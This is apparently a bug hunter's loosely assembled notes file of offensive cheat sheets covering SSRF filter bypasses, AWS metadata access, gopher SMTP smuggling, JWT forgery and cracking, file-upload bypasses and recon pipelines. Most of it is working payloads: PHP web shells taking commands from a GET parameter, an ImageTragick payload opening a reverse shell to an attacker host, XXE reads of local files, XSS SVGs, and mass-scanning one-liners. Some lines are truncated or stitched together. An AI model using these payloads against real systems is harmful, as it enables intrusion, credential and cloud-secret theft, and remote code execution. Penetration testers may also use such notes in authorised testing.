+   EXCEPT     EXCEPT         EXCEPT     EXCEPT    OF SSEF
+   
+   Advanced exploit using a redirection
+
+1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
+2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+
+Advanced exploit using type=url
+
+Change "type=file" to "type=url"
+Paste URL in text field and hit enter
+Using this vulnerability users can upload images from any image URL = trigger an SSRF
+
+Bypassing filters
+Bypass using HTTPS
+
+https://127.0.0.1/
+https://localhost/
+
+Bypass localhost with [::]
+
+http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squidhttp://0000::1:80/
+http://0000::1:25/ SMTP
+http://0000::1:22/ SSH
+http://0000::1:3128/ Squid
+
+Bypass localhost with a domain redirection
+
+http://spoofed.burpcollaborator.net
+http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
+http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
+
+The service nip.io is awesome for that, it will convert any ip address as a dns.
+
+NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
+
+Bypass localhost with CIDR
+
+It’s a /8
+
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+
+Bypass using a decimal IP location
+
+http://0177.0.0.1/
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+
+Bypass using IPv6/IPv4 Address Embedding
+
+IPv6/IPv4 Address Embedding
+
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+Bypass using malformed urls
+
+localhost:+11211aaa
+localhost:00011211aaaa
+
+Bypass using rare address
+
+You can short-hand IP addresses by dropping the zeros
+
+http://0/
+http://127.1
+http://127.0.1
+
+Bypass using bash variables
+
+(curl only)
+
+curl -v "http://evil$google.com"
+$google = ""
+
+Bypass using tricks combination
+
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+
+Bypass filter_var() php function
+
+0://evil.com:80;http://google.com:80/
+
+Bypass against a weak parser
+
+by Orange Tsai (Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
+
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+
+SSRF exploitation via URL Scheme
+File
+
+Allows an attacker to fetch the content of a file on the server
+
+file://path/to/file
+file:///etc/passwd
+file://\/\/etc/passwd
+ssrf.php?url=file:///etc/passwd
+
+HTTP
+
+Allows an attacker to fetch any content from the web, it can also be used to scan ports.
+
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+
+The following URL scheme can be used to probe the network
+Dict
+
+The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+ssrf.php?url=dict://attacker:11111/
+
+SFTP
+
+A network protocol used for secure file transfer over secure shell
+
+ssrf.php?url=sftp://evil.com:11111/
+
+TFTP
+
+Trivial File Transfer Protocol, works over UDP
+
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+
+LDAP
+
+Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
+
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+
+Gopher
+
+ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20sa
+   
+   
+   
+   
+   
+   
+   
+   SSRF IN DNS REBRINDING
+  set dns rebrinding to   127.0.0.1/google ip  or any other bypass and send many request with burp intruder and watch response that come back different lenght than others
+  check if it is an aws metadata IP and try to  retrieve data from there by firing up burp intruder
+  
+  TIP
+  Blind SSRF via image upload URL downloader on 
+https://example{.}com
+
+Steps to Reproduce
+
+1.Create a one test account.
+2.Login to that account.
+3.Go to edit profile.
+4.Scroll down there.
+5.Notice user picture field.
+6. Try to upload something.
+7. You will see URL downloader.
+8. Open your burp collaborator client.
+9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
+10. Poll now in burp collaborator client.
+11.Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
+12.Turn your foxy proxy on and open your burp suite.
+13.Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
+14.Intercept request. Request
+15. You will notice one error showing some info about server which confirms Blind SSRF again. 
+16 .By the way if you change to 25 port its leaking something about Postfix SMTP server.
+17.Also I was able to identify that your web app is using libcurl.
+  
+  
+  
+  
+     Blind SSRF Oneliner:
+cat wayback.txt|gf ssrf |qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
+
+cat wayback.txt|gf ssrf |grep -a -i \=http|qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
 
     
+    Blind SSRF Oneliner(X-Forwarded-Host):
+echo "testphp.vulnweb.com"|assetfinder|httprobe|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
+
+echo "testphp.vulnweb.com"|assetfinder|httpx|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
+
+   tip
+   Automating SSRF using Autorepeater 🔒
+
+In this window of Auto-Repeater, we can specify some regex to find urls. In this case, I'll use this regex.
+https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
+
+   
+   tips 
+Bypass #SSRF filters by using http://127.1 instead of http://127.0.0.1
+  It resolves to the same but confuses filters blocking localhost/127.0.0.1 specifically!  and also remember that 
+      file:///etc/passwd : Not authorized
+      file://\/\/etc/passwd : Work 😀
+      
+      tips
+      using wordlistgen
+      go get -u github.com/ethicalplayground/wordlistgen
+      
+      cat "https://example.com" | getjs -complete | ./wordlistgen -p param.txt -d"www.example.com" | tee wordlist.txt
+      
+      //replace variables with payload and always change payload with ssrf payload
+      
+      cat wordlist.txt | qsreplace http://127.0.0.1/admin | tee -a host.txt 
+      
+      use httpx to keep track of the code
+      cat hosttxt | httpx -title -status-code
+      
+      
+      tips 
+      Gathered the in-scope domains.
+      Started active and passive subdomain enumeration  using subfinder (with API Keys of different services such as Shodan, Chaos, GitHub, Sublist3r, etc). For Active    subdomain enumeration, Best DNS Wordlist from Assetnote Wordlist
+      filter out the live domains based on the status code
+      check for its status
+      
+      ***     ****     ***
+      subfinder -d target.com > domains.txt
+      cat domains.txt | httprobe > live_domains.txt
+      cat live_domains.txt | waybackurls > urls.txt
+      cat urls.txt | httpx — status-code-title > status.txt                 identify the status, title, tech
+      check the url aof status.txt and check for interesting endpoint  of password, username, mail.com, token, access_token, url=, redirect_url=, api id=,    accessUrl=, payment,
+      make use of any ooast and replace it at any intersting endpoint
+      
+      and also search on burp history, the top parameter thta could be accessbe to ssrf  example = url={target} file={target} filename={target} , then when found, try xss, lfi, open redirect and also URL schemas file:///, dict://, ftp://, gopher://  and also check the magic ip of aws in example below
+      https://reducted.com/gadgets/proxy/?url=http://169.254.169.254/latest/meta-data
+      
+      ****** alwys don’t ignore edit buttons
+
+      payload
+      https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest
+      
+      
+     ***** tip  ****
+     To reach the client-side, we need our SSRF to reflect the headers used by the client this is common in SSRF that will serve as a proxy so the attacker can define a proxy in the application.
+
+By doing this we have something similar to a subdomain takeover, as we can take over all the content that transits to that subdomain. This already very impactful in the case of a domain but in the case of an out of scope subdomain, or a dev environment, it may not have as much effect, as there are not many direct requests for regions like this and the company can inform that this is not under their control, reducing the impact of the vulnerability.
+
+  If the SSRF is on ssrf.dev.example.com, we need to find an application with authentication on *.example.com that has cookies set as follows:
+
+Set-cookie: session=SECRET_SESSION, domain=.example.com, HttpOnly
+
+    upload fuctionality to ssrf 
+Attacker creates a JSON file with the following contents in Google drive
+{"downloadUrl": "http://169.254.169.254/latest/meta-data/"}
+Attacker signs into HelloSign, uploads the created drive file to it, and intercepts the request
+Inject the ?alt=media parameter in the file id value
+Get the AWS metadata in the response
+  
+  or 
+  created .html file with the code and pasted the copied payload and saved the file  
+ <html>
+<body>
+<img src=http://<BurpCollaboratorURL></img>
+</body>
+</html>
+
+  upload the doucment and wait for a pingback
+
+
+        TIP WITH GITHUB RECON   ON SSRF
+        gau -subs example.com | unfurl domains>> vul1.txt
+        waybackurls example.com | unfurl domains >> vul2.txt
+        subfinder -d example.com -silent >> vul3.txt
+        
+        sorting
+        cat vul1.txt vul2.txt vul3.txt | sort -u >> unique_sub.txt
+        
+        github recon 
+        “testdev.admin.example.com” user:<username> auth_token
+
+        “testdev.admin.example.com” user:<username> apikey
+
+         “testdev.admin.example.com” user:<username> secret
+         find parameters
+         “corps.example.com” org:<name of organization> “/admin/dashboard”
+
+         “testdev.example.com” org:<name of organization> “/users/dashboard”
+
+           “example.com” org:<name of organization> “/admin/setup”
+        “example.com” org:<name of organization> “next_url”
+
+          “example.com” org:<name of organization> “img_url”
+
+         Still no success But when i use these parameter “image”
+            “example.com” org:<name of organization> “image”
+            
+        got     /fetch/info?inquiry=&image_Host=https://example.com/user/         // check if you can get and url
+        
+            use aws metadata instance
+            curl -sk “https://example.com/fetch/info?inquiry=&image_Host=http://169.254.169.254/”   got somany endpoint
+            
+            text the endpoint on all subdomain
+            cat unique_sub.txt | sort -u | httpx -silent -path “/fetch/info?inquiry=&image_Host=http://169.254.169.254/” -status-code -content-length    //more ssrf
+            
+         
+         TIP ON BLIND SSRF TO RCE
+         gf ,qsreplace ,ffuf ,gau ,waybackurls
+         
+        gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
+        
+        cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt
+        
+        ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
+        Now we will check whetherwe get any http request hit on our burp collaborator server
+        if the is, chain to RCE  exampe
+        http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami`
+        
+        
+        Finding SSRF BY Full Automation
+        waybackurl targetme.com >> blindssrftesturl.txt
+        gau -subs targetme.com >> blindssrftesturl.txt     
+        
+        cat blindssrftesturl.txt | sort -u |anew | httpx | qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’
+        or
+        cat blindssrftesturl.txt | sort -u |anew | httpx |tee -a prefinal_ssrftesturl.txt  
+        cat prefinal_ssrftesturl.txt | gf ssrf >> final_ssrftesturl.txt
+        
+        cat final_ssrftesturl.txt |qsreplace “Burp collaborator server” >> ssrf_auto-ffuf.txt
+
+        ffuf -c -w ssrf_auto-ffuf.txt -u FUZZ
+
+       Then check for any dns pingback hit you burp collaborator server.
+
+        IF you get any ping back and go for internal port scanning.
+        
+        
+        
+        CHANGING TO SVG IMAGE TAG
+        <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"> 
+<image height="30" width="30" 
+xlink:href="https://controlledserver.com/pic.svg" /> 
+</svg>
+
+  
+  
+    When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.
+        
+        
+        
+         \\\\\\\\NOTE NOTE NOTE NOTE NOTE NOTE ////////
+         
+         the often overlooked ability to use an @ to create a misleading URL is frequently useful.
+
+To understand why, you should know that, according to RFC 3986, the presence of a @ character in the authority part of a URL has a very specific meaning: it marks the end of the (optional) userinfo part and the beginning of the host part. By appending @attacker-site.com to the host part of a URL, you can often coax an incautious server into sending a request to attacker-site.com rather than to the originally intended host. This trick has worked for me time and time again, and this occasion was no exception. By issuing the following request, I was again able to obtain a 502 Bad Gateway response from the proxy.
+
+GET /https://pro-api.coinmarketcap.com@exfil.jub0bs.com HTTP/1.1
+Host: proxy.example.org
+--snip--
+
+HTTP/1.1 502 Bad Gateway
+--snip--
+(Note: I could have simply leveraged Burp Collaborator here, but I wasn’t aware of that feature at the time.)
+
+Had I managed to trick the proxy into sending a request to my exfil subdomain? To check this, I deployed a minimal server to exfil.jub0bs.com. I repeated that last attack and immediately inspected my server’s log files. Waiting for me there was a new log entry about a recent HTTP request. “Success!”, I exulted.
+
+
+   web cache rulles withb ssrf
+   
+   GET  https://www.example.com/page.css=(http://169.254.169.254/latest/meta-data/      ====   response is no cached
+     GET  https://www.example.com/page.css=(http://169.254.169.254/latest/meta-data?     ==== response is cached 
+     
+     GET  https://www.example.com/page.css= (http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?   ==== response is cached
+     
+     
+     JWT   JWT    JWT    JWT   ATTACK   JWT
+     
+     1. Check for sensitive data in the JWT 
+Inspect the payload section for any user or sensitive information.
+
+2.
+ None Attack: try to set the algorithm header field to “none”, then encode the header using base64-encoding, and delete the signature part then send it to the server. If you lucky this will lead to bypassing the signature check, so you didn’t need to crack the password.
+
+$ jwt_tool <JWT_Token> -X a
+
+$ jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik11c2FiIEFsaGFyYW55Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODc3MjI4NDl9.X3tG7w5QvFJ5eIetPnG8ECyM4l2E7pBcC_j9iZWY7Qg -X a
+
+ None algorithm
+Change "alg:" to none "alg:none"  
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+
+
+
+
+2a) Change the user role from user to admin
+  "name": "smartkelvin",
+  "role": 'admin',
+  "int": 12344fff
+  }
+
+***  ***
+ - Crack the token password:
+  # jwt_tool <JWT_Token> -C -d passwordList.txt
+
+# jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik11c2FiIEFsaGFyYW55Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODc3MjI4NDl9.X3tG7w5QvFJ5eIetPnG8ECyM4l2E7pBcC_j9iZWY7Qg -C -d /usr/share/wordlists/rockyou.txt
+
+ Null signature attack: 
+  jwt_tool <JWT_Token> -X n
+
+
+3. Algorithm Switch -  Move from RS256 to HS256:
+Obtain the public key from the application.
+Generate a new JWT token.
+Test payload modifications using the new token.
+
+
+****    ******
+- Blank password: generate signature with algorithm and blank password:
+
+#jwt_tool <JWT_Token> -X b
+
+
+4. Signature not being checked - Verify if the signature is being checked:
+Use the JSON Web Token Tab or JOSEPH.
+Modify the payload or remove the signature to test vulnerabilities.
+
+— PLAYBOOK SCAN: 
+Try to manipulate all the contents of the token to scan for common JWT vulnerabilities.
+you can automate your test by this command:
+
+#jwt_tool -t http://example.com -rh “Authorization: Bearer <JWT_Token>” -M pb
+
+6. Null kid
+Investigate the presence of a null “kid” (key ID) value.
+
+- Key-Confusion attack:
+   #jwt_tool <JWT_Token> -X k -pk < public-key-pem >
+   
+   
+   TOKEN REPLAY ATTACKS: 
+   reuse the old token or use the token after logout or after changing the password or e-mail, because if the JWT token is not invalidated or refreshed the attacker may be able to use the token to continue to access the system as the logged-in user.
+
+
+The top 3 popular tools recommended 😎 ->
+1. The JSON Web Token Toolkit 
+Create tokens, find problems, and boost bounty rewards with an easy command-line tool. It's perfect for spotting weaknesses in how JWTs are used.
+https://github.com/ticarpi/jwt_tool
+
+2. JWT Editor extension 
+With JWT Editor extension you can seamlessly edit and analyze JWTs within your browser, simplifying debugging.
+https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd
+
+3. jwtXploiter 
+A tool to test security of JSON Web Tokens. It is written in python and you automate JWT testing against all known CVEs.
+https://github.com/DontPanicO/jwtXploiter
+
+
+     Dns  takeover       dns takeover   dns takeover 
+     Detection of DNS takeovers
+The exact way to check if a domain is vulnerable varies a bit depending on which service it is pointing to - but generally, there are two criteria:
+
+The domain returns a SERVFAIL (or sometimes REFUSED) when you try to resolve it
+The authoritative nameservers for that domain belong to one of the vulnerable services in the list above
+     
+      dig tesla.com +trace
+       dnstrace -nsonly A google.com
+
+      
+      
+      
+      
+      FILE UPLOAD CHEATSHEET           FILE UPLOAD CHEATSHEET          FILE UPLOAD CHEATSHEET    
+      
+    https://github.com/sAjibuu/Upload_Bypass 
+    
+ check this write   https://zvitox.medium.com/server-access-admin-panel-and-rfu-bypass-45af32057a2d
+ check hacktricks file upload
+ check    https://medium.com/@red.whisperer/5-advanced-ways-i-test-for-file-upload-vulnerabilities-5b01358f87d1
+ 
+ 
+    tip    check the portswigger lab  on file upload  and this write up by     https://medium.com/@red.whisperer/5-advanced-ways-i-test-for-file-upload-vulnerabilities-5b01358f87d1
+    
+    tip
+    Path Traversal By Uploading Files
+Another vulnerability that sometimes get overlooked is path traversal through file upload. Unlike the classic path traversal that let us read files on the target server, in file upload we are aiming to upload files to locations that the server is not expecting to.
+    
+      tip
+      File upload
+      
+
+From File upload to other vulnerabilities
+
+
+CheatSheet
+
+Use the following cheat sheet to examine any file upload functionality
+
+1.  upload.random123         --- To test if random file extensions can be uploaded.
+2.  upload.php               --- try to upload a simple php file.
+3.  upload.php.jpeg          --- To bypass the blacklist.
+4.  upload.jpg.php           --- To bypass the blacklist.
+5.  upload.php               --- and Then Change the content type of the file to version - 1 2 3 4 5 6 7.
+6.  upload.php*              --- To bypass The BlackList.
+7.  upload.PHP               --- To bypass The BlackList.
+8.  upload.PhP               --- To bypass The BlackList.
+9.  upload.PhP               --- To bypass The BlackList.
+10. upload .htaccess         --- By uploading this [jpg,png] files can be executed.
+11. pixelFlood.jpg           --- To test against the DOS.
+12. frameflood.gif           --- upload gif file with 10^10 Frames.
+13. Malicious zTXT           --- upload UBER.jpg
+14. Upload zip file          --- test against Zip slip (only when file upload support is available).
+15. Check Overwrite Issue    --- Upload file.txt and file.txt with different content.
+16. SVG to XSS               --- Check if you can upload SVG files and can turn them to XSS.
+17. SQLi Via File upload     --- Try uploading `sleep(10)-- .jpg` as file.
+
+
+Set filename to ../../../tmp/lol.png and try to achieve a path traversal
+
+Set filename to sleep(10)-- -.jpg and you may be able to achieve a SQL injection
+
+Set filename to <svg onload=alert(document.domain)> to achieve a XSS
+
+Set filename to ; sleep 10; to test some command injection
+
+
+Check for file upload  in hactrick
+      
+      tip
+      if you got a file upload, try every possible way to escalate it further. Upload almost everything and see if application allows you to upload something like a script. Change extensions, add an extra extension, these things will surely help you to learn a lot of things. Also, always keep an eye on URLS with every passing endpoint. Default parameters are super helpful in escalating SSRFs.
+      
+       
+Where to find
+In upload file feature, for example upload photo profile feature
+How to exploit
+read also this pdf it contains a many of ideas
+1-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf
+by 0xAwali
+2-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf by ebrahim
+hegazy
+1. Change the Content-Type value
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+Change the Content-Type
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/jpeg
+2. Try to change the extension when send the request, for example in here you cant upload file with ext
+php but you can upload jpg file
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
+Content-Type: application/x-php
+Change the request to this
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+
+
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+3. Upload the payload, but start with GIF89a; and
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/gif
+GIF89a; <?php system("id") ?>
+And dont forget to change the content-type to image/gif
+
+4. Bypass content length validation, it can be bypassed using small payload
+(<?=`$_GET[x]`?>)
+5. Using null byte in filename
+file.php%00.gif
+6. Using double extensions for the uploaded file
+file.jpg.php
+7. Uploading an unpopular php extensions (php4,php5,php6,phtml)
+file.php5
+8. Try to randomly capitalizes the file extension
+file.pHP5
+9. Mix the tips!
+Upload Function
+Extensions Impact
+ASP , ASPX , PHP5 , PHP , PHP3 : Webshell, RCE
+SVG : Stored XSS, SSRF, XXE
+GIF : Stored XSS, SSRF
+CSV : CSV injection
+XML : XXE
+AVI : LFI, SSRF
+HTML , JS : HTML injection, XSS, Open redirect
+PNG , JPEG : Pixel flood attack (DoS)
+
+ZIP : RCE via LFI, DoS
+PDF , PPTX : SSRF, BLIND XXE
+Blacklisting Bypass
+PHP → .phtm , phtml , .phps , .pht , .php2 , .php3 , .php4 , .php5 , .shtml , .phar ,
+.pgif , .inc
+ASP → asp , .aspx , .cer , .asa
+Jsp → .jsp , .jspx , .jsw , .jsv , .jspf
+Coldfusion → .cfm , .cfml , .cfc , .dbm
+Using random capitalization → .pHp , .pHP5 , .PhAr
+Whitelisting Bypass
+file.jpg.php
+file.php.jpg
+file.php.blah123jpg
+file.php%00.jpg
+file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg
+and change the D (44) in hex to 00.
+file.php%00
+file.php%20
+file.php%0d%0a.jpg
+file.php.....
+file.php/
+file.php.\
+file.php#.png
+file.
+.html
+Vulnerabilities
+[ ] Directory Traversal
+Set filename ../../etc/passwd/logo.png
+Set filename ../../../logo.png as it might changed the website logo.
+[ ] SQL Injection
+Set filename 'sleep(10).jpg .
+Set filename sleep(10)-- -.jpg .
+[ ] Command Injection
+Set filename ; sleep 10;
+[ ] SSRF
+Abusing the "Upload from URL", if this image is going to be saved in some public site,
+you could also indicate a URL from IPlogger and steal information of every visitor.
+SSRF Through .svg file.
+
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.o
+[ ] ImageTragic
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0
+pop graphic-context
+[ ] XXE
+Upload using .svg file
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="htt
+<text font-size="40" x="0" y="16">&xxe;</text>
+</svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" w
+<image xlink:href="expect://ls"></image>
+</svg>
+Using excel file
+[ ] XSS
+Set file name filename="svg onload=alert(document.domain)>" ,
+filename="58832_300x300.jpg<svg onload=confirm()>"
+Upload using .gif file
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+Upload using .svg file
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DT
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb
+<script type="text/javascript">
+alert("HolyBugx XSS");
+</script>
+</svg>
+[ ] Open Redirect
+a. Upload using .svg file
+      <code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+onload="window.location='https://attacker.com'"
+xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0
+</svg>
+</code>
+Content-ish Bypass
+[ ] Content-type validation
+Upload file.php and change the Content-type: application/x-php or Content-Type
+: application/octet-stream to Content-type: image/png or Content-type: image/gif
+or Content-type: image/jpg .
+[ ] Content-Length validation
+Small PHP Shell
+(<?=`$_GET[x]`?>)
+[ ] Content Bypass Shell
+If they check the Content. Add the text "GIF89a;" before you shell-code. ( Contenttype: image/gif )
+GIF89a; <?php system($_GET['cmd']); ?>
+Misc
+[ ] Uploading file.js & file.config (web.config)
+[ ] Pixel flood attack using image
+[ ] DoS with a large values name: 1234...99.png
+[ ] Zip Slip
+If a site accepts .zip file, upload .php and compress it into .zip and upload it.
+Now visit, site.com/path?page=zip://path/file.zip%23rce.php
+[ ] Image Shell
+Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file
+mv pic.jpg pic.php.jpg
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
+
+ tips
+ 1️⃣ Missed Extension: Finding missed extensions that can be executed on the server side or can be dangerous on the   client side.
+Example:  “.php5”, “.pht”, “.phtml”, “.shtml”, “.asa”, “.cer”, “.asax”, “.swf”, or “.xap”
+
+ 2)Case Sensitive: Changing a number of letters to their capital forms to bypass case sensitive rules.
+Example: “file.aSp” or “file.PHp3”
+3️⃣ Control Characters: Using control characters such as null character (0x00) after a forbidden extension and before a permitted one may lead to a bypass. 
+Example: file.php%00.jpg
+Here .jpg gets truncated and .php becomes the new extension.
+4️⃣ Double Extension: Using 2 different extensions after the file name helps us to bypass the restriction.
+Example: file.php.jpg
+5️⃣ Line Termination Trick: Write each letter of the extension in a new line. 
+
+Example:
+
+file.
+p
+h
+p
+
+
+      
+    note 
+     when files  upload is only sensitive to the content-type, not the file extension. turned on intercept in Burp Suite and uploaded a PHP file, changing the content-type to image/png in that request  
+      
+      
+      check for gap tools in burp and x8 tool
+      gap to extract parameters of the same domain
+    
+    
+      
+    
+  TIP
+  ///ZSEANO TOOLKIT AND METHODOLOGY //      ///ZSEANO TOOLKIT AND METHODOLOGY //      ///ZSEANO TOOLKIT AND METHODOLOGY //
+    discovery subdomain and content 
+  amass: amass enum -brute-active -d domain.com -o amass-output.txt
+  
+  working http and https server
+  cat amass-output.txt | httprobe -p http:81 -p http:3000 -p http:3001 -p http:8000 -p http:8080 -p http:8443 -c 50 | tee online-domain.txt
+  
+  dnsgen for some gems
+  amass-output.txt | dnsgen - | httprobe
+  
+  vitual inspection
+  cat domains-endpoint.txt | aquatone
+  
+  to discover files and directories
+  ffuf -ac -v -u https://domain/FUZZ -w wordlist
+  
+  hacking scripts
+  github.com/tomnonnom
+  
+  
+  waybackurlmachine scanner:  this will scrape /robot.txt for all domain i provided  and scrape as many yeasr as possibele. from here i will simply scan each endpoint found via burpintruder or ffuf and determine which endpoint are stll alive 
+  tools: https://gist.github/mhmdiaa
+  also scrapp the home page of each subdomian found to check what used to be there  and also start scrapping for common end point 
+  
+  tools
+  paramscanner, linkfinder, parameth
+  
+  anychanges tool : this tools takes a list of urls and regular check for any changes on th pages. it looks for a new href and reference a new javascript filles 
+  
+  allows try to find new content ,parameters and functionality to look at, website changes every day and you will like to be the first to look out for it and also always take a peak into the website history to check for old files/ directory
+   
+   startng out 
+   allows look out for filters and try to bypass them..
+   
+       xss methodology
+       find out wht payload are allows and how th website reflect them..
+       check for doble encoding
+       check how website reflect incomplete tags    <iframe src=//smart.com/c=
+       
+       
+       check if <script> was reflected as &lt;script&gt;, but %26lt;script%26gt; was reflected as <script>,  If not matter what you try you always see &lt;script&gt; or %3Cscript%3E then the parameter in question may not be vulnerable.
+       
+       ssrf
+       always test how they handle redirect
+       looks for fixture with URL parameter, on a large bounty program, i will instantly try to find their api console (usually on their developer Docs page)
+       allows check for company that uses jira, company dont allows patch their cves
+       
+       
+       
+       
+       
+       # Passive Enumeration
+$ subfinder -d redacted.com -o subfinder.txt
+$ amass enum -d --passive redacted.com -o amass.txt
+$ echo redacted.com | assetfinder --subs-only | tee assetfinder.txt
+$ cat subfinder.txt amass.txt assetfinder.txt | sort -u | anew Psubdomains.txt
+
+# Active Enumeration
+$ puredns bruteforce subdomains-wordlist.txt redacted.com -r resolvers-wordlist.txt -w puredns.txt
+$ cat subdomains.txt | alterx | anew alterx.txt
+
+$ cat alterx.txt puredns.txt | sort -u | anew Asubdomains.txt
+
+# Sorting and Collecting active and passive subdomains
+$ cat Asubdomains.txt Psubdomains.txt | sort -u | anew subdomains.txt
+
+# Checking Alive Subdomains
+$ cat subdomains.txt | httpx -mc 200 | anew alive-subdomains.txt
+
+# Checking subdomains with httprobe
